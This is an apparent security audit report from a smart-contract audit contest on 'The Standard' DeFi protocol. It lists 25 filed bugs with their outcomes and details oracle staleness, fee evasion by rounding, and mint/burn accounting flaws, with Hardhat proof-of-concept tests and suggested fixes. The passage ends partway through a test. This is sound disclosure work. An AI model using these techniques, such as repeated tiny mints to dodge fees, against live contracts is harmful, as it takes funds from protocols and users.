# Leaderboard
[CodeHawks: The Standard Audit Contest](https://www.codehawks.com/contests/clql6lvyu0001mnje1xpqcuvl) 
<br>

`Rank 6 / 100`

# Audited Code Repo
### [The Standard : Repo](https://github.com/Cyfrin/2023-12-the-standard)

<br>

# Bugs Filed & Their Status

| # | Bug ID | Name | URL | Adjudged Status |
|--------|--------|------|:------:|-----------------:|
| 1 | [H-01](#h-01)    | status() function can return stale data or the L2 sequencer could be down, allowing minted > maxMintable() in reality or an incorrect distributeAssets() | [7](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/7) | Invalidated as known issue |
| 2 | [H-02](#h-02)    | User can mint(), burn() & swap() without ever paying any fee | [28](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/28) | Accepted as Low |
| 3 | [H-03](#h-03)    | Incorrect mint() & burn() calculations reduce subsequent minting power & charge extra fee | [70](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/70) | Invalidated |
| 4 | [H-04](#h-04)    | Front-running allows holder to gain a share of fees | [159](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/159) | Accepted as Low |
| 5 | [H-05](#h-05)    | Tokens with a fee-on-transfer mechanism like PAXG, will break the protocol | [216](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/216) | Invalidated |
| 6 | [H-06](#h-06)    | Liquidation rewards can be gained without paying any EUROs | [333](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/333) | Accepted as Low |
| 7 | [H-07](#h-07)    | User can get liquidated due to incorrect calculateMinimumAmountOut() | [537](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/537) | Accepted as Low; Selected for Report |
| 8 | [H-08](#h-08)    | No incentive to liquidate small positions could result in protocol going underwater | [575](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/575) | Accepted as Med; Selected for Report |
| 9 | [H-09](#h-09)    | Attacker can create any amount of ETH as rewards | [811](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/811) | Accepted as High |
|10 | [H-10](#h-10)    | Possible to DoS all major functions of the protocol | [1015](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/1015) | Accepted as High |
|11 | [M-01](#m-01)    | swap() deadline incorrectly set to block.timestamp | [6](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/6) | Incorrectly invalidated, but other report accepted as Med |
|12 | [M-02](#m-02)    | Protocol unable to handle tokens with decimals() > 18 | [73](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/73) | Invalidated |
|13 | [M-03](#m-03)    | Griefer can deny holders of their fair share of fees | [94](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/94) | Accepted as Low; Selected for Report |
|14 | [M-04](#m-04)    | Fees denied to protocol/holders & funds are stuck for various combinations of holders and fees | [151](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/151) | Accepted as Low |
|15 | [M-05](#m-05)    | All Chainlink USD pair price feeds don't have 8 decimals | [255](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/255) | Invalidated |
|16 | [M-06](#m-06)    | Incorrect value returned by position() function | [338](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/338) | Accepted as Low; Selected for Report |
|17 | [M-07](#m-07)    | Vault can become undercollateralized without warning if token removed from accepted list | [572](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/572) | Accepted as Low |
|18 | [M-08](#m-08)    | User can manage to pay less than expected fee for minting EUROs | [629](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/629) | Invalidated |
|19 | [M-09](#m-09)    | Risk of upgrade issues due to missing __gap variable | [670](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/670) | Invalidated |
|20 | [M-10](#m-10)    | Incorrect initialize() implementation makes SmartVaultManagerV5 un-upgradeable | [675](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/675) | Invalidated |
|21 | [M-11](#m-11)    | Minting exposes users to unlimited slippage & deadline | [731](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/731) | Invalidated |
|22 | [M-12](#m-12)    | runLiquidation() has no deadline & exposes liquidators to unlimited slippage which is dangerous when coupled with lack of access control | [752](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/752) | Invalidated |
|23 | [M-13](#m-13)    | No slippage protection in swap() if it does not drop collateral value below minimum level | [764](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/764) | Invalidated |
|24 | [M-14](#m-14)    | Holder receives lesser reward due to division before multiplication | [915](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/915) | Accepted as Low |
|25 | [L-01](#l-01)    | Confirmed stakers may be considered as pending on Arbitrum & lose out on rewards | [755](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/755) | Invalidated |


<br>

## **HIGH-SEVERITY BUGS**
---

### <a id="h-01"></a>[H-01]
## **status() function can return stale data or the L2 sequencer could be down, allowing minted > maxMintable() in reality or an incorrect distributeAssets()**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L94
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L75
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L67
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L99
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L156
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L83
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L127
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L206
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L207-L218
<br>

## Summary
- [distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L207-L218) fetches `latestRoundData` from chainlink which is never checked for staleness or an incomplete round or if the L2 sequencer is down and as such can result in incorrect `rewards`/assets being distributed, since the protocol could be relying on outdated values

- Similarly, the following functions all make use of the variable `calculator = IPriceCalculator(_priceCalculator)` present on [L40](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L40) to fetch `latestRoundData` from chainlink. These can result in the user minting more tokens than the allowed `maxMintable`, since the protocol could be relying on outdated values:
    - [status()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L94)
    - [maxMintable()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L75)
    - [undercollateralised()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L99)
    - [fullyCollateralised()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L156)
    - [getAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L83)
    - [canRemoveCollateral()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L127)
    - [euroCollateral()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L67)
    - [calculateMinimumAmountOut()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L206)

- Additionally, there's the issue of "Unhandled Chainlink Revert - Denial Of Service" as outlined in [Cyfrin's article](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#e100) as no try/catch blocks have been used in functions like `distributeAssets()` while calling `latestRoundData()`.

## Vulnerability Details
- Unchecked chainlink data being used inside `distributeAssets()`:

```js
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
@--->   (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
@--------->             (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
                        ....
                        ....
```

- [calculator](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L40) variable is used to call `tokenToEurAvg()`, `tokenToEur()` and `eurToToken()` which internally call `latestRoundData()` on [L47](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L47), [L56](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L56) and [L63](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L63) but never check if the data is stale. <br>
Hence, [maxMintable()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L75) can be an outdated value resulting in the user able to [remove more collateral than they should be](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L129) able to or even [minting more than they should be](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L162) able to.

- Additionally, calls to Chainlink could revert, which may result in a complete Denial-of-Service as outlined in [OZ blog](https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/#:~:text=the%20multisigs%20can%20immediately%20block%20access%20to%20price%20feeds%20at%20will). Chainlink multisigs can immediately block access to price feeds at will, so just because a price feed is working today does not mean it will continue to do so indefinitely. Smart contracts should handle this by wrapping calls to Oracles in try/catch blocks and dealing appropriately with any errors.

```js
    function euroCollateral() private view returns (uint256 euros) {
        ITokenManager.Token[] memory acceptedTokens = getTokenManager().getAcceptedTokens();
        for (uint256 i = 0; i < acceptedTokens.length; i++) {
            ITokenManager.Token memory token = acceptedTokens[i];
@------>    euros += calculator.tokenToEurAvg(token, getAssetBalance(token.symbol, token.addr));
        }
    }
```

```js
    function maxMintable() private view returns (uint256) {
@--->   return euroCollateral() * ISmartVaultManagerV3(manager).HUNDRED_PC() / ISmartVaultManagerV3(manager).collateralRate();
    }
```

```js
    function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
        if (minted == 0) return true;
@--->   uint256 currentMintable = maxMintable();
        uint256 eurValueToRemove = calculator.tokenToEurAvg(_token, _amount);
        return currentMintable >= eurValueToRemove &&
            minted <= currentMintable - eurValueToRemove;
    }
```

```js
    function mint(address _to, uint256 _amount) external onlyOwner ifNotLiquidated {
        uint256 fee = _amount * ISmartVaultManagerV3(manager).mintFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
@--->   require(fullyCollateralised(_amount + fee), UNDER_COLL);
        minted = minted + _amount + fee;
        EUROs.mint(_to, _amount);
        EUROs.mint(ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsMinted(_to, _amount, fee);
    }
```

## Impact
Use of stale values (or a _down_ L2 sequencer, or a Chainlink revert) can 
- result in breaking the invariant that the user should not be able to mint more than `maxMintable`.
- result in user being able to remove more than allowed collateral.
- result in either more or less than expected rewards/assets transferred via `distributeAssets()`.
- result in a complete Denial-of-Service to those calling `distributeAssets()`.

## Tools Used
Manual inspection

## Recommendations
While fetching the `latestRoundData` in `PriceCalculator.sol` [L47](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L47), [L56](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L56) and [L63](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L63), add the following checks each time. Similar check needs to be added inside `distributeAssets()`:

```diff
-       (, int256 eurUsdPrice,,,) = clEurUsd.latestRoundData();
+       (uint80 roundId, int256 eurUsdPrice,, uint256 updatedAt, uint80 answeredInRound) = clEurUsd.latestRoundData();
+       require(eurUsdPrice > minAnswer && eurUsdPrice < maxAnswer, "Chainlink price outside min & max bounds"); // @audit : protocol should set reasonable limits for `minAnswer` & `maxAnswer` beforehand
+       require(updatedAt > block.timestamp - staleTimePeriod[tokenPair][network], "Stale price"); // @audit : set `staleTimePeriod` to some value based on the network & `heartbeat` of that token-pair. See here: https://docs.chain.link/data-feeds/price-feeds/addresses/?network=arbitrum&page=1
+       require(answeredInRound >= roundId, "Stale price");
```

Also, we need to check if the L2 sequencer is up before fetching the above price feed. Code needs to be added as per: https://docs.chain.link/data-feeds/l2-sequencer-feeds
```js
        (
            /*uint80 roundID*/,
            int256 answer,
            uint256 startedAt,
            /*uint256 updatedAt*/,
            /*uint80 answeredInRound*/
        ) = sequencerUptimeFeed.latestRoundData();

        // Answer == 0: Sequencer is up
        // Answer == 1: Sequencer is down
        bool isSequencerUp = answer == 0;
        if (!isSequencerUp) {
            revert SequencerDown();
        }

        // Make sure the grace period has passed after the
        // sequencer is back up.
        uint256 timeSinceUp = block.timestamp - startedAt;
        if (timeSinceUp <= GRACE_PERIOD_TIME) {
            revert GracePeriodNotOver();
        }
```

In addition to the above, surround the chainlink calls with `try/catch` as explained [here](https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/#:~:text=the%20multisigs%20can%20immediately%20block%20access%20to%20price%20feeds%20at%20will).

---

### <a id="h-02"></a>[H-02]
## **User can mint(), burn() & swap() without ever paying any fee**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L161
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L170
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L215
<br>

## Summary
Rounding-down inside [mint()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L161), [burn()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L170) & [swap()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L215) allows a user to pass a small `_amount` multiple times and escape paying any fee ever.<br>
Root cause: Whenever feeRate (like `mintFeeRate`/`burnFeeRate`/`swapFeeRate`) for the above actions is set less than `HUNDRED_PC`, it's possible to pass an `_amount` such that the fee evaluates to zero due to rounding-down present in the calculation. 

[SmartVaultV3.sol#L160-L167](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L160-L167)
```js
    function mint(address _to, uint256 _amount) external onlyOwner ifNotLiquidated {
@---->  uint256 fee = _amount * ISmartVaultManagerV3(manager).mintFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        require(fullyCollateralised(_amount + fee), UNDER_COLL);
        minted = minted + _amount + fee;
        EUROs.mint(_to, _amount);
        EUROs.mint(ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsMinted(_to, _amount, fee);
    }
```

[SmartVaultV3.sol#L169-L175](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L169-L175)
```js
    function burn(uint256 _amount) external ifMinted(_amount) {
@--->   uint256 fee = _amount * ISmartVaultManagerV3(manager).burnFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        minted = minted - _amount;
        EUROs.burn(msg.sender, _amount);
        IERC20(address(EUROs)).safeTransferFrom(msg.sender, ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsBurned(_amount, fee);
    }
```

[SmartVaultV3.sol#L214-L231](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L214-L231)
```js
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
@---->  uint256 swapFee = _amount * ISmartVaultManagerV3(manager).swapFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        address inToken = getSwapAddressFor(_inToken);
        uint256 minimumAmountOut = calculateMinimumAmountOut(_inToken, _outToken, _amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: inToken,
                tokenOut: getSwapAddressFor(_outToken),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: _amount - swapFee,
                amountOutMinimum: minimumAmountOut,
                sqrtPriceLimitX96: 0
            });
        inToken == ISmartVaultManagerV3(manager).weth() ?
            executeNativeSwapAndFee(params, swapFee) :
            executeERC20SwapAndFee(params, swapFee);
    }
```

## Vulnerability Details
Let us examine the current values of `mintFeeRate` (or burn/swap fee rates) and `HUNDRED_PC`, as present in unit tests:
- `ISmartVaultManagerV3(manager).mintFeeRate()` = $500$
- `HUNDRED_PC` = 1e5 = $100,000$

So if a user passes `_amount` as $199$, `fee` would be calculated as ${199 * 500} \div 100000 = 0$ (rounding down by solidity). So if a user wants to mint an amount of $15000$, he can simply call `mint()` a total of 100 times with `_amount = 150`.<br>

Add the following code inside `test/smartVault.js` and run via `npx hardhat test --grep 'no fee paid' test/smartVault.js`. The 3 tests will pass.
```js
  describe('no fee paid', async () => {
    it('allows zero fees while minting', async () => {
      // setup - add some collateral first
      const value = ethers.utils.parseEther('1');
      await user.sendTransaction({to: Vault.address, value});
      let { collateral} = await Vault.status();
      expect(getCollateralOf('ETH', collateral).amount).to.equal(value);
      
      // free mint now
      const mintedAmount = 100;
      // let us mint without fee over & over again
      for(let i = 0; i < 5; i++) {
        let minted = await Vault.connect(user).mint(user.address, mintedAmount);
        await expect(minted).to.emit(Vault, 'EUROsMinted').withArgs(user.address, mintedAmount, 0); // @audit : no fee paid by user
      }
    });

    it('allows zero fees while burning', async () => {
      // setup - add some collateral first
      const value = ethers.utils.parseEther('1');
      await user.sendTransaction({to: Vault.address, value});
      let { collateral} = await Vault.status();
      expect(getCollateralOf('ETH', collateral).amount).to.equal(value);
      
      // mint some euros
      await Vault.connect(user).mint(user.address, ethers.utils.parseEther('0.9'));

      // burn without fee now
      const burnAmount = 100;
      // let us burn without fee over & over again
      for(let i = 0; i < 5; i++) {
        let burned = await Vault.connect(user).burn(burnAmount);
        await expect(burned).to.emit(Vault, 'EUROsBurned').withArgs(burnAmount, 0); // @audit : no fee paid by user
      }
    });

    it('allows zero fees while swapping', async () => {
      // setup 
      let Stablecoin = await (await ethers.getContractFactory('ERC20Mock')).deploy('sUSD', 'sUSD', 6);
      const clUsdUsdPrice = 100000000;
      const ClUsdUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('sUSD / USD');
      await ClUsdUsd.setPrice(clUsdUsdPrice);
      await TokenManager.addAcceptedToken(Stablecoin.address, ClUsdUsd.address);
      
      // user vault has 1 ETH collateral
      await user.sendTransaction({to: Vault.address, value: ethers.utils.parseEther('1')});
      // user borrows 1200 EUROs
      const borrowValue = ethers.utils.parseEther('1200');
      await Vault.connect(user).mint(user.address, borrowValue);
      const inToken = ethers.utils.formatBytes32String('ETH');
      const outToken = ethers.utils.formatBytes32String('sUSD');
      
      // @audit-info : user is swapping 100 wei
      const swapValue = ethers.utils.parseEther('0.0000000000000001');
      const swapFee = swapValue.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC);
      expect(swapFee).to.equal(0, "zero swap fee"); // @audit-info : zero fee
      const protocolBalance = await protocol.getBalance();
      
      // swap
      await Vault.connect(user).swap(inToken, outToken, swapValue);
      
      const {
        amountIn, txValue
      } = await SwapRouterMock.receivedSwap();

      // @audit : no fee deducted or added in the following variables
      expect(amountIn).to.equal(swapValue); 
      expect(txValue).to.equal(swapValue);
      expect(await protocol.getBalance()).to.equal(protocolBalance);
    });
  });
```

## Impact
- Loss of fee for the protocol

## Tools Used
Hardhat

## Recommendations
Rounding-up needs to be done here instead of rounding-down. Either use an external library like [solmate](https://github.com/transmissions11/solmate) which has a function like [mulDivUp](https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol#L53) or incorporate custom logic. The following recommendation shows such a custom logic for `mint()`, but can be duplicated for `burn()` and `swap()` too in the same manner:

```diff
    function mint(address _to, uint256 _amount) external onlyOwner ifNotLiquidated {
        uint256 fee = _amount * ISmartVaultManagerV3(manager).mintFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
+       uint256 addExtra = (fee * ISmartVaultManagerV3(manager).HUNDRED_PC()) == (_amount * ISmartVaultManagerV3(manager).mintFeeRate()) ? 0 : 1;
+       fee = fee + addExtra;
        require(fullyCollateralised(_amount + fee), UNDER_COLL);
        minted = minted + _amount + fee;
        EUROs.mint(_to, _amount);
        EUROs.mint(ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsMinted(_to, _amount, fee);
    }
```

---

### <a id="h-03"></a>[H-03]
## **Incorrect mint() & burn() calculations reduce subsequent minting power & charge extra fee**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L160-L167
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L169-L175
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L157
<br>

## Summary
Mismatch between calculation styles of `minted` variable [inside mint()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L163) and [inside burn()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L171) results in the following issues. **These occur because `fee` is not taken into account in a consistent manner while calculating `minted`** -
- `minted` is not reset to zero even when the user burns the amount he minted. He has to **_pay more fee_** in case he wants to reset this to zero.
- If he does not pay more fee during `burn()`, ${minted} \neq 0$ results in a reduced ability for the user to `mint()` now. He is not able to mint the max amount.
- If he does not pay more fee during `burn()`, he is not able to remove all of his collateral since [canRemoveCollateral()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L128) does not allow him to do so by returning `false`.

[SmartVaultV3.sol#L160-L167](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L160-L167)
```js
    function mint(address _to, uint256 _amount) external onlyOwner ifNotLiquidated {
        uint256 fee = _amount * ISmartVaultManagerV3(manager).mintFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        require(fullyCollateralised(_amount + fee), UNDER_COLL);
@---->  minted = minted + _amount + fee;
        EUROs.mint(_to, _amount);
        EUROs.mint(ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsMinted(_to, _amount, fee);
    }
```

[SmartVaultV3.sol#L169-L175](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L169-L175)
```js
    function burn(uint256 _amount) external ifMinted(_amount) {
        uint256 fee = _amount * ISmartVaultManagerV3(manager).burnFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
@---->  minted = minted - _amount;
        EUROs.burn(msg.sender, _amount);
        IERC20(address(EUROs)).safeTransferFrom(msg.sender, ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsBurned(_amount, fee);
    }
```

[SmartVaultV3.sol#L127-L133](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L127-L133)
```js
    function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
@---->  if (minted == 0) return true;
        uint256 currentMintable = maxMintable();
        uint256 eurValueToRemove = calculator.tokenToEurAvg(_token, _amount);
        return currentMintable >= eurValueToRemove &&
            minted <= currentMintable - eurValueToRemove;
    }
```

[SmartVaultV3.sol#L156-L158](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L156-L158)
```js
    function fullyCollateralised(uint256 _amount) private view returns (bool) {
@---->  return minted + _amount <= maxMintable();
    }
```

## Vulnerability Details
Let us see an example:
- Few initial suppositions first for easier calculation (you can keep the default values too if you wish to, just that the arrived figures will be a bit different):
    - Let ETH_USD_PRICE = $1
    - Let EUR_USD_PRICE = $1
    - Let COLLATERAL_RATE = 120%
    - Let mint & burn FEE_RATE = 0.5%
- User deposits $1.206$ ETH as collateral. 
    - This means he can receive $1$ EUROs in his account upon minting. This is because $mintFee = 1 EUROs * 0.5\% = 0.005$. Hence, `minted` value as per [L163](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L163) is $minted = 0 + 1 + 0.005 = 1.005$. With a `collateralRate` of $120\%$, this is his max limit since $1.005 * 120\% = 1.206$
- User goes ahead and calls mint(1e18) to receive 1 EUROs in his account. Also, $minted = 1.005$ since `fee` is added while calculating it.
- User wants to burn all his minted EUROs. He calls `burn(1e18)`. He is charged the burnFee of $0.005$ on [L173](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L173). However, [L171](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L171) incorrectly reduces `minted` to $minted = minted - \_amount = 1.005 - 1 = 0.005$, not resetting it to zero since `fee` has been excluded from this calculation.
- User is now constrained unfairly and faces the following issues -
    - He can not now mint again the value $1$ (or $1.005$ including fee) and his minting capacity is reduced to $0.995024875621890548$
        - He can't mint $1$ because [fullyCollateralized()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L157) which is called internally by [mint()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L162) returns `false` since $0.005 + 1.005 > 1.005$
        - His reduced value is $0.995024875621890548$ because $0.005 + 0.995024875621890548 + (0.5\% * 0.995024875621890548) <= 1.005$ and any value greater than $0.995024875621890548$ calculates to higher than $1.005$, the `maxMintable()`.
    - He can not now remove his full collateral since [canRemoveCollateral()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L127) returns `false` for `_amount` equalling $1.206$
- If he wants to regain his full powers, he needs to agree to pass an `_amount` figure of $1.005$ to the burn() function by calling `burn(1.005e18)` which will reset `minted` to $0$, but he will have to pay more fee due to this -
    - $newFee = 0.5\% * 1.005 = 0.005025$, thus paying this as an unfair additional fee.

<br>

Add the following inside `test/smartVault.js` and run via `npx hardhat test --grep 'incorrect burning calculation' test/smartVault.js`. The tests will pass all assertions.
```js
  describe('incorrect burning calculation', async () => {
    it('miscalculates collateral ratio of user after repeated burns - part 1', async () => {
      expect(await Vault.undercollateralised()).to.equal(false);
      
      const collateralPutUp = ethers.utils.parseEther('1.206');
      // @audit-info : maxMintable() would be calculated as 1.005
      await user.sendTransaction({to: Vault.address, value: collateralPutUp});
      
      // @audit-info : set prices = 1 for easier calculations
      await ClEthUsd.setPrice(100000000);
      await ClEurUsd.setPrice(100000000);
      
      const { maxMintable } = await Vault.status();
      expect(maxMintable).to.equal(ethers.utils.parseEther('1.005'), 'maxMintable');

      const mintedValue = ethers.utils.parseEther('1');
      await Vault.connect(user).mint(user.address, mintedValue);
      expect(await Vault.undercollateralised()).to.equal(false);
      const { minted } = await Vault.status();
      expect(minted).to.equal(ethers.utils.parseEther('1.005'), "minted");
      
      // approve transfer to protocol
      await EUROs.connect(user).approve(Vault.address, ethers.utils.parseEther('1000'));

      // ****************************************** INTERMEDIATE SETUP STEPS *****************************************************
      // ******** let's use another account to credit `user` with some EUROs which can be used to pay burn-fee later *************
      await VaultManager.connect(otherUser).mint();
      const { status } = (await VaultManager.connect(otherUser).vaults())[0];
      const { vaultAddress } = status;
      const Vault2 = await ethers.getContractAt('SmartVaultV3', vaultAddress);
      await otherUser.sendTransaction({to: Vault2.address, value: ethers.utils.parseEther('99')});
      await Vault2.connect(otherUser).mint(user.address, ethers.utils.parseEther('50'));

      // @audit-info : `user` should now have 51 EUROs => 50 EUROs given by `otherUser` + 1 EUROs minted by `user` himself.
      expect(await EUROs.balanceOf(user.address)).to.equal(ethers.utils.parseEther('51')); 
      // ********************************* EUROs for burn-fee credited to `user` now *********************************************
      
      // @audit-info : `user` wants to burn all minted EUROs
      const burnedValue = ethers.utils.parseEther('1');
      burn = Vault.connect(user).burn(burnedValue);
      await expect(burn).to.emit(Vault, "EUROsBurned").withArgs(burnedValue, ethers.utils.parseEther('0.005'));
      let [, updatedMinted,,,,,,] = await Vault.status();
      
      // @audit-info : Bug. `minted` should have been equal to 0 here, but it's 0.005 now, since fee was not taken into account.
      expect(updatedMinted).to.equal(ethers.utils.parseEther('0.005'), "afterBurn");

      // @audit-info : capacity of `user` to mint decreases progressively each time he mints, eventually reaching 0. Next time, he 
      // will be able to mint only `(maxMintable() - minted - someFee) => 0.9950....`. 
      let notAllowedMintableAmount = '.995024875621890549'; // @audit : this is less than the value of 1 which one would expect
      let allowedMintableAmount = '.995024875621890548'; 
      await expect(Vault.connect(user).mint(user.address, ethers.utils.parseEther(notAllowedMintableAmount))).to.be.revertedWith('err-under-coll');
      await expect(Vault.connect(user).mint(user.address, ethers.utils.parseEther(allowedMintableAmount))).to.not.be.reverted;
      
      // @audit-info : This also means that in order to burn everything in the above example, he should have burnt 
      // `1.005` instead of `1`, effectively paying `0.005 * 1.005 = 0.005025` as fee instead of the expected `0.005`. 
      // Check that out in the following test: `miscalculates collateral ratio of user after repeated burns - part 2`.

    });

    it('miscalculates collateral ratio of user after repeated burns - part 2', async () => {
      expect(await Vault.undercollateralised()).to.equal(false);
      
      const collateralPutUp = ethers.utils.parseEther('1.206');
      // @audit-info : maxMintable() would be calculated as 1.005
